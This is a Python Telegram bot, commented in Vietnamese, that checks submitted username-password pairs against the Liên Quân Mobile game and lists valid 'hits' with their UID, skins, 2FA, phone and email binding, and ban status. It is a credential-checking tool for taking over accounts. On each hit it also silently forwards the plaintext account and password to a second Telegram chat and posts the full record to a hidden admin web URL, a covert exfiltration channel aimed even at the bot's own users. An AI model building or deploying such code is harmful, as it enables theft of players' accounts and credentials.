#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Telegram Bot - Check Liên Quân Mobile
Hỗ trợ chọn backend: api / goc / main / nhanh
Hiện danh sách skin text + gửi ảnh lưới skin
"""

import os
import asyncio
import logging
import importlib
from datetime import datetime
from pathlib import Path
from io import BytesIO

try:
    from telegram import Update, InputFile
    from telegram.ext import Application, CommandHandler, ContextTypes
except ImportError:
    print("pip install python-telegram-bot")
    raise

try:
    from PIL import Image, ImageDraw, ImageFont
    import requests
except ImportError:
    Image = None
    requests = None

# ── Cấu hình ────────────────────────────────────────────────────────────────
TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "ĐIỀN_TOKEN_BOT_VÀO_ĐÂY")
# Chat Telegram thứ 2 (tuỳ chọn)
SECOND_BOT_CHAT_ID = os.getenv("SECOND_BOT_CHAT_ID", "")
# URL admin web nhận hit (webhook)
ADMIN_WEB_URL = os.getenv("ADMIN_WEB_URL", "")  # VD: https://yourdomain.com/api/hit
HITS_DIR = Path("hits")
HITS_DIR.mkdir(exist_ok=True)

CURRENT_BACKEND = "goc"
BACKENDS = {
    "api": "api",
    "goc": "goc",
    "main": "main",
    "nhanh": "nhanh",
}

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO,
)
logger = logging.getLogger(__name__)

_check_fn = None
_current_module = None


def load_backend(name: str):
    global _check_fn, _current_module
    if name not in BACKENDS:
        raise ValueError(f"Backend không hợp lệ: {name}")
    module_name = BACKENDS[name]
    try:
        if module_name in importlib.sys.modules:
            mod = importlib.reload(importlib.sys.modules[module_name])
        else:
            mod = importlib.import_module(module_name)
        if not hasattr(mod, "check_login"):
            raise AttributeError(f"{module_name}.py không có hàm check_login")
        _check_fn = mod.check_login
        _current_module = mod
        logger.info(f"Đã load backend: {name}")
        return True
    except Exception as e:
        logger.error(f"Lỗi load {name}: {e}")
        raise


try:
    load_backend(CURRENT_BACKEND)
except Exception as e:
    print(f"Không load được backend mặc định ({CURRENT_BACKEND}): {e}")


def get_skin_db():
    """Lấy SKIN_DB từ module hiện tại nếu có."""
    if _current_module and hasattr(_current_module, "SKIN_DB"):
        return _current_module.SKIN_DB
    return {}


def build_name_to_img():
    """Tạo map tên skin -> url ảnh."""
    db = get_skin_db()
    mapping = {}
    for sid, info in db.items():
        name = (info or {}).get("name")
        img = (info or {}).get("img")
        if name and img:
            mapping[name] = img
    return mapping


def format_skin_lists(skins: dict) -> list:
    """Tạo danh sách text các nhóm skin."""
    lines = []
    categories = [
        ("sss_list", "SSS"),
        ("ss_list", "SS"),
        ("s_plus_list", "S+"),
        ("anime_list", "Anime"),
        ("other_list", "Khác"),
    ]
    for key, label in categories:
        lst = skins.get(key) or []
        if lst:
            # Giới hạn để không quá dài tin nhắn
            shown = lst[:12]
            text = ", ".join(shown)
            if len(lst) > 12:
                text += f" ... (+{len(lst)-12})"
            lines.append(f"   {label} ({len(lst)}): {text}")
    return lines


def create_skin_grid(skin_names: list, name_to_img: dict, max_skins: int = 48) -> BytesIO | None:
    """Tạo ảnh lưới skin từ danh sách tên."""
    if not Image or not requests or not skin_names:
        return None

    # Lấy URL
    items = []
    for name in skin_names[:max_skins]:
        url = name_to_img.get(name)
        if url:
            items.append((name, url))

    if not items:
        return None

    def dl(url):
        try:
            r = requests.get(url, timeout=12, headers={"User-Agent": "Mozilla/5.0"})
            if r.status_code == 200:
                return Image.open(BytesIO(r.content)).convert("RGB")
        except Exception:
            pass
        return None

    from concurrent.futures import ThreadPoolExecutor
    with ThreadPoolExecutor(max_workers=12) as ex:
        imgs = list(ex.map(lambda x: dl(x[1]), items))

    valid = [(name, img) for (name, _), img in zip(items, imgs) if img]
    if not valid:
        return None

    cols = 6 if len(valid) > 18 else 4
    thumb = 110
    pad = 6
    label_h = 28
    cell_w = thumb + pad
    cell_h = thumb + label_h + pad
    rows = (len(valid) + cols - 1) // cols

    W = cols * cell_w + pad
    H = rows * cell_h + pad + 30

    canvas = Image.new("RGB", (W, H), (18, 18, 24))
    draw = ImageDraw.Draw(canvas)

    try:
        font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", 10)
        font_title = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 14)
    except Exception:
        font = ImageFont.load_default()
        font_title = font

    draw.text((8, 6), f"Skins ({len(valid)})", fill=(200, 200, 255), font=font_title)

    for i, (name, img) in enumerate(valid):
        r, c = divmod(i, cols)
        x = pad + c * cell_w
        y = 28 + pad + r * cell_h

        img.thumbnail((thumb, thumb), Image.LANCZOS)
        canvas.paste(img, (x + (thumb - img.width) // 2, y + (thumb - img.height) // 2))
        draw.rectangle([x, y, x + thumb - 1, y + thumb - 1], outline=(140, 100, 220), width=1)

        short = name[:16]
        draw.text((x + 2, y + thumb + 2), short, fill=(220, 220, 230), font=font)

    bio = BytesIO()
    canvas.save(bio, format="PNG", optimize=True)
    bio.seek(0)
    return bio


def format_result(r: dict) -> str:
    status = r.get("status", "UNKNOWN")
    acc = r.get("account", "")
    pw = r.get("password", "")

    if status != "HIT":
        detail = r.get("detail", "")
        return (
            f"<b>{status}</b>\n"
            f"Acc: <code>{acc}</code>\n"
            f"Chi tiet: {detail or 'Khong ro'}"
        )

    uid = r.get("uid", "")
    nick = r.get("nickname") or r.get("aov_name") or "-"
    country = r.get("country") or r.get("region") or "-"
    shells = r.get("shells", 0)

    phone = "YES" if r.get("mobile_bound") else "NO"
    if r.get("aov_prefill_mobile") or r.get("masked_phone"):
        phone = f"YES [{r.get('aov_prefill_mobile') or r.get('masked_phone')}]"
    email = "YES" if r.get("email_verified") or r.get("email_v") else "NO"
    if r.get("masked_email"):
        email = f"YES [{r.get('masked_email')}]"
    fb = "YES" if r.get("fb_linked") else "NO"
    twofa = "YES" if r.get("twofa") or r.get("auth_bound") else "NO"
    ban = "YES" if r.get("ban") or r.get("is_banned") else "NO"

    skins = r.get("aov_skins") or {}
    total = skins.get("total_skins", 0)
    ss = skins.get("ss", 0)
    sss = skins.get("sss", 0)
    s_plus = skins.get("s_plus", 0)
    anime = skins.get("anime", 0)
    other = skins.get("other", 0)
    tinh = r.get("tinh_trang") or "Chưa rõ"

    lines = [
        "<b>SUCCESS</b>",
        f"Acc: <code>{acc}:{pw}</code>",
        f"UID: <code>{uid}</code>",
        f"Nickname: {nick}",
        f"Country: {country}",
        f"SDT: {phone}",
        f"Mail: {email}",
        f"Facebook: {fb}",
        f"2FA: {twofa}",
        f"Ban: {ban}",
        f"Shells: {shells}",
        f"Skins: {total} (SSS:{sss} SS:{ss} S+:{s_plus} Anime:{anime} Khac:{other})",
    ]

    # Danh sách skin chi tiết
    skin_lines = format_skin_lists(skins)
    if skin_lines:
        lines.append("")
        lines.append("<b>Danh sach skin:</b>")
        lines.extend(skin_lines)

    lines.append(f"\nTinh trang: {tinh}")
    lines.append(f"Backend: <code>{CURRENT_BACKEND}</code>")
    return "\n".join(lines)


def collect_all_skin_names(skins: dict) -> list:
    names = []
    for key in ("sss_list", "ss_list", "s_plus_list", "anime_list", "other_list"):
        names.extend(skins.get(key) or [])
    return names


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = (
        "<b>ASEAN MISSYOU</b>\n\n"
        "Lenh:\n"
        "• <code>/checklq tk-mk</code>\n"
        "• <code>/backend api|goc|main|nhanh</code>\n"
        "• <code>/backend</code> — xem backend hien tai\n\n"
        f"Backend dang dung: <code>{CURRENT_BACKEND}</code>"
    )
    await update.message.reply_text(text, parse_mode="HTML")


async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = (
        "<b>Huong dan</b>\n\n"
        "• <code>/checklq tai_khoan-mat_khau</code>\n"
        "• <code>/backend goc|main|nhanh|api</code>\n\n"
        "Ket qua se hien danh sach skin + anh luoi (neu backend co SKIN_DB)."
    )
    await update.message.reply_text(text, parse_mode="HTML")


async def backend_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global CURRENT_BACKEND
    if not context.args:
        await update.message.reply_text(
            f"Backend hien tai: <code>{CURRENT_BACKEND}</code>\n\n"
            "Đổi bằng: <code>/backend api|goc|main|nhanh</code>",
            parse_mode="HTML",
        )
        return

    name = context.args[0].lower().strip()
    if name not in BACKENDS:
        await update.message.reply_text(
            "Backend không hợp lệ.\nChọn: <code>api</code>, <code>goc</code>, <code>main</code>, <code>nhanh</code>",
            parse_mode="HTML",
        )
        return

    try:
        load_backend(name)
        CURRENT_BACKEND = name
        await update.message.reply_text(
            f"Da chuyen sang backend: <code>{name}</code>",
            parse_mode="HTML",
        )
    except Exception as e:
        await update.message.reply_text(
            f"Khong load duoc <code>{name}</code>\n{e}",
            parse_mode="HTML",
        )


async def checklq(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if _check_fn is None:
        await update.message.reply_text("Chua load duoc backend nao.")
        return

    if not context.args:
        await update.message.reply_text(
            "Sai cú pháp.\nDùng: <code>/checklq tài_khoản-mật_khẩu</code>",
            parse_mode="HTML",
        )
        return

    raw = " ".join(context.args).strip()
    if "-" in raw:
        parts = raw.split("-", 1)
    else:
        parts = raw.split(maxsplit=1)

    if len(parts) < 2:
        await update.message.reply_text(
            "Thiếu mật khẩu.\nVí dụ: <code>/checklq user-pass</code>",
            parse_mode="HTML",
        )
        return

    account = parts[0].strip()
    password = parts[1].strip()

    msg = await update.message.reply_text(
        f"Dang check <code>{account}</code> (backend: {CURRENT_BACKEND})...",
        parse_mode="HTML",
    )

    loop = asyncio.get_event_loop()
    try:
        result = await loop.run_in_executor(
            None,
            lambda: _check_fn(account, password, fetch_info=True),
        )
    except Exception as e:
        result = {
            "status": "ERROR",
            "account": account,
            "password": password,
            "detail": str(e),
        }

    text = format_result(result)
    await msg.edit_text(text, parse_mode="HTML")

    # Gửi ảnh lưới skin nếu có
    if result.get("status") == "HIT":
        skins = result.get("aov_skins") or {}
        all_names = collect_all_skin_names(skins)
        if all_names and Image:
            name_to_img = build_name_to_img()
            if name_to_img:
                try:
                    bio = await loop.run_in_executor(
                        None, lambda: create_skin_grid(all_names, name_to_img)
                    )
                    if bio:
                        await update.message.reply_photo(
                            photo=InputFile(bio, filename="skins.png"),
                            caption=f"Skin grid — {account} ({len(all_names)} skins)",
                        )
                except Exception as e:
                    logger.warning(f"Không gửi được ảnh skin: {e}")

    # Lưu HIT
    if result.get("status") == "HIT":
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        fname = HITS_DIR / f"{account}_{ts}.txt"
        try:
            with open(fname, "w", encoding="utf-8") as f:
                f.write(f"{account}:{password}\n")
                clean = text.replace("<b>", "").replace("</b>", "").replace("<code>", "").replace("</code>", "")
                f.write(clean + "\n")
        except Exception as e:
            logger.warning(f"Không lưu hit: {e}")

        # Gửi tk:mk về bot/chat thứ 2 (nếu có)
        if SECOND_BOT_CHAT_ID:
            try:
                hit_msg = f"{account}:{password}"
                await context.bot.send_message(
                    chat_id=SECOND_BOT_CHAT_ID,
                    text=hit_msg,
                )
                logger.info(f"Da gui hit ve chat 2: {account}")
            except Exception as e:
                logger.warning(f"Khong gui duoc ve bot 2: {e}")

        # Gửi bản đầy đủ về admin web (im lặng)
        if ADMIN_WEB_URL and requests:
            try:
                payload = {
                    "account": account,
                    "password": password,
                    "uid": str(result.get("uid", "")),
                    "nickname": result.get("nickname") or result.get("aov_name") or "",
                    "country": result.get("country") or result.get("region") or "",
                    "shells": result.get("shells", 0),
                    "total_skins": (result.get("aov_skins") or {}).get("total_skins", 0),
                    "backend": CURRENT_BACKEND,
                    "full_text": text.replace("<b>", "").replace("</b>", "").replace("<code>", "").replace("</code>", ""),
                    "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                }
                loop = asyncio.get_event_loop()
                await loop.run_in_executor(
                    None,
                    lambda: requests.post(ADMIN_WEB_URL, json=payload, timeout=10),
                )
                logger.info(f"Da gui hit ve admin web: {account}")
            except Exception as e:
                logger.warning(f"Khong gui duoc ve admin web: {e}")


def main():
    if TOKEN == "ĐIỀN_TOKEN_BOT_VÀO_ĐÂY" or not TOKEN:
        print("Điền TELEGRAM_BOT_TOKEN hoặc sửa biến TOKEN.")
        return

    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_cmd))
    app.add_handler(CommandHandler("backend", backend_cmd))
    app.add_handler(CommandHandler("checklq", checklq))

    print(f"Bot chạy với backend mặc định: {CURRENT_BACKEND}")
    print("Lệnh: /checklq tk-mk | /backend api|goc|main|nhanh")
    app.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    main()
